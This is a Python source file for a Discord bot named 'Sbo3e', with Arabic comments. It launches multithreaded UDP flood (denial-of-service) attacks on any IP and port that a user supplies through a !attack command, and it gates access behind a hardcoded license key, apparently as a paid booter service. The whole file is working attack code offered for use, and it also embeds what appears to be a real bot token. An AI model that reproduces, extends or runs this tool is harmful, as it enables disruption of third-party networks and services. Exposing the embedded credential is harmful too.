import discord
from discord.ext import commands
import socket
import threading
import random
import os

# --- إعدادات Sbo3e الاحترافية ---
TOKEN = 'MTQ2NjU4NzM3NjkxNzY4MDMzMQ.GpD0lL.RR5Js9yth8EZs9Dipo1sdP2jVQ6BHj1_R7Acd0'
LICENSE_KEY = "SBO3E-VIP-2026" # الكود الذي يفعّل الأداة للمستخدمين
AUTHORIZED_USERS = [] # سيتم إضافة المستخدمين المفعّلين هنا تلقائياً

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

attacking = False

# المحرك القوي نفسه (بدون تغيير) [cite: 2026-01-30]
def attack_engine(ip, port):
    payload = random._urandom(1024)
    while attacking:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
        except:
            pass

@bot.event
async def on_ready():
    print(f'Sbo3e Bot is Online!')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Targets | !help"))

# أمر التفعيل (للسماح للمستخدم باستخدام البوت)
@bot.command()
async def activate(ctx, key: str):
    if key == LICENSE_KEY:
        if ctx.author.id not in AUTHORIZED_USERS:
            AUTHORIZED_USERS.append(ctx.author.id)
            await ctx.send(f"✅ **Activation Successful!** Welcome {ctx.author.mention} to Sbo3e Elite.")
        else:
            await ctx.send("ℹ️ You are already activated.")
    else:
        await ctx.send("❌ Invalid Key! Contact Sbo3e for access.")

# أمر الهجوم
@bot.command()
async def attack(ctx, ip: str, port: int, threads: int):
    global attacking
    if ctx.author.id not in AUTHORIZED_USERS:
        return await ctx.send("🚫 Access Denied! Use `!activate YOUR_KEY` first.")

    if attacking:
        return await ctx.send("⚠️ Another storm is already running!")

    attacking = True
    await ctx.send(f"🚀 **STORM LAUNCHED!**\n🎯 **Target:** `{ip}`\n🔌 **Port:** `{port}`\n⚡ **Power:** `{threads}` threads\n👤 **By:** {ctx.author.mention}")
    
    for _ in range(threads):
        threading.Thread(target=attack_engine, args=(ip, port), daemon=True).start()

# أمر الإيقاف
@bot.command()
async def stop(ctx):
    global attacking
    if ctx.author.id not in AUTHORIZED_USERS: return
    attacking = False
    await ctx.send("🛑 **Storm Terminated by Sbo3e System.**")

bot.run(TOKEN)
